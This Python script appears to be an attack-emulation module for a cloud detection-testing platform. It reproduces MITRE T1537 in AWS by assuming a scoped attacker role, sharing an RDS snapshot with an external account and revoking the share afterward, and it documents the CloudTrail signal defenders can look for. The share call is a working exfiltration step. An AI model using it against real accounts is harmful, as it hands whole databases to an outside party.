"""
Technique : aws.exfiltration.rds-share-snapshot
Tactic    : Exfiltration (T1537)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.exfiltration.rds-share-snapshot/

How the attack works:
  An attacker with rds:ModifyDBSnapshotAttribute shares an RDS snapshot with an
  external AWS account using the "restore" attribute. The attacker can then
  restore the snapshot in their own account, gaining full access to all database
  contents. This is one of the most impactful data exfiltration techniques for
  RDS databases.

Detection signal:
  - rds:ModifyDBSnapshotAttribute in CloudTrail with valuesToAdd containing an
    external (non-organization) AWS account ID.

Revert:
  - Automated: ModifyDBSnapshotAttribute with valuesToRemove in the finally block.

Credential model:
  Option B. Sharing a snapshot externally is destructive, so the attack assumes
  the scoped attacker role created by infra/. That role's policy is pinned to
  this emulation's own snapshot ARN, so no other snapshot in the account can be
  shared even if this script were wrong.

Backend contract:
  run(outputs: dict, region: str = "us-east-1") -> None
  Reads `snapshot_id` and `attacker_role_arn` from the Pulumi stack outputs.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import time

import boto3
from botocore.exceptions import ClientError

# Simulated attacker-controlled AWS account ID (Stratus Red Team dummy account).
# The share is revoked in the finally block; the value only has to be a
# syntactically valid, non-owning account for the detection signal to fire.
ATTACKER_ACCOUNT_ID = "193672423079"
DWELL_TIME_S = 2


def _bootstrap_session(outputs: dict, region: str):
    """Session for the attack. In the MayaTrail backend the worker injects the
    tenant's short-lived assumed-role credentials as outputs['_aws_credentials'];
    use them so the attack runs in the tenant account. Falls back to the ambient
    default session for standalone runs."""
    creds = (outputs or {}).get("_aws_credentials")
    if creds:
        return boto3.Session(
            aws_access_key_id=creds.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=creds.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=creds.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def _assume_role_with_retry(sts_client, role_arn, session_name, duration=3600, max_attempts=5):
    """
    AssumeRole with propagation retry.

    A freshly created IAM role and its inline policy take a few seconds to become
    consistent; sts:AssumeRole can return AccessDenied during that window.
    """
    retryable = {"AccessDenied", "InvalidClientTokenId", "AuthFailure"}
    last_exc = None
    for attempt in range(1, max_attempts + 1):
        try:
            return sts_client.assume_role(
                RoleArn=role_arn,
                RoleSessionName=session_name,
                DurationSeconds=duration,
            )
        except ClientError as exc:
            code = exc.response["Error"]["Code"]
            if code in retryable and attempt < max_attempts:
                print(f"  [~] AssumeRole attempt {attempt}/{max_attempts} got {code}, retrying in 5s")
                time.sleep(5)
                last_exc = exc
            else:
                raise
    raise RuntimeError(f"AssumeRole failed after {max_attempts} attempts: {last_exc}")


def _attacker_session(outputs: dict, region: str, session_name: str):
    """
    Build the session the technique runs as.

    The tenant credentials injected by the worker are used only to assume the
    scoped attacker role this emulation's infra creates. The destructive call is
    then made by that role, so IAM bounds the blast radius rather than the
    correctness of this script.
    """
    role_arn = (outputs or {}).get("attacker_role_arn", "")
    if not role_arn:
        raise RuntimeError("Missing required Pulumi output: attacker_role_arn")

    sts = _bootstrap_session(outputs, region).client("sts")
    creds = _assume_role_with_retry(sts, role_arn, session_name)["Credentials"]
    print(f"  [+] Assumed scoped attacker role: {role_arn}")
    print("  [!] CloudTrail event: sts:AssumeRole")
    return boto3.Session(
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"],
        region_name=region,
    )

def banner(msg: str) -> None:
    print(f"\n{'=' * 60}\n  {msg}\n{'=' * 60}")


def run(outputs: dict, region: str = "us-east-1") -> None:
    snapshot_id = (outputs or {}).get("snapshot_id", "")
    if not snapshot_id:
        raise RuntimeError("Missing required Pulumi output: snapshot_id")

    banner("Step 0 - Assume the scoped attacker role (AssumeRole)")
    session = _attacker_session(outputs, region, "atomic-t1537-rdsshare")
    rds_client = session.client("rds", region_name=region)

    try:
        # ── Step 1: Share snapshot with attacker account ──────────────────────
        banner("Step 1 - Share RDS snapshot with external account (ModifyDBSnapshotAttribute)")
        rds_client.modify_db_snapshot_attribute(
            DBSnapshotIdentifier=snapshot_id,
            AttributeName="restore",
            ValuesToAdd=[ATTACKER_ACCOUNT_ID],
        )
        print(f"  [+] Snapshot {snapshot_id} shared with account: {ATTACKER_ACCOUNT_ID}")
        print("  [!] CloudTrail event: rds:ModifyDBSnapshotAttribute")
        print("  [!] Attacker can now restore the database snapshot in their account.")

        # ── Step 2: Verify the share ──────────────────────────────────────────
        banner("Step 2 - Verify snapshot attribute was set")
        attrs = rds_client.describe_db_snapshot_attributes(DBSnapshotIdentifier=snapshot_id)
        for attr in attrs["DBSnapshotAttributesResult"]["DBSnapshotAttributes"]:
            if attr["AttributeName"] == "restore":
                print(f"  [+] restore permissions: {attr.get('AttributeValues', [])}")

        time.sleep(DWELL_TIME_S)

    finally:
        # ── Revert: Remove attacker account from snapshot permissions ─────────
        banner("Revert - Revoke restore permission (ModifyDBSnapshotAttribute)")
        try:
            rds_client.modify_db_snapshot_attribute(
                DBSnapshotIdentifier=snapshot_id,
                AttributeName="restore",
                ValuesToRemove=[ATTACKER_ACCOUNT_ID],
            )
            print(f"  [+] Restore permission revoked for account: {ATTACKER_ACCOUNT_ID}")
            print("  [!] CloudTrail event: rds:ModifyDBSnapshotAttribute")
        except ClientError as exc:
            print(f"  [!] ModifyDBSnapshotAttribute (remove) failed: {exc}")

    banner("Complete")
    print("CloudTrail events: sts:AssumeRole, rds:ModifyDBSnapshotAttribute x2, "
          "rds:DescribeDBSnapshotAttributes")
